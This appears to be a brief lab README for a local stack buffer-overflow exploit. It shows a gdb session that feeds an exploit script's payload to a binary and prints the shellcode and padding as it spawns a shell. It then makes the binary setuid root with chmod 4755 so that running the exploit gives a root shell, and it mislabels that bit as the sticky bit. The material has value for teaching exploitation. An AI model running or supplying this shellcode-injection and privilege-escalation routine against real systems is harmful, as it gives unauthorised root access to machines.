When exploit is executed you should have bash session running at the end.

Example
$gdb -q ./unknown
gdb > run `python exploit.py`

Starting program: /home/vagrant/Desktop/exploit/buffer-overflow/unknown `python exploit.py`
1Ph//shh/bin°
             ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
process 8563 is executing new program: /bin/dash
$

$ su root
$ chmod 4755 ../../unknown

Because we have sticky bit set for ./unknown
we should have root shell at the end
rwsr-xr-x 1 root root 5596 Nov 20 21:29 ../../unknown

$ ../../unknown `python exploit.py`
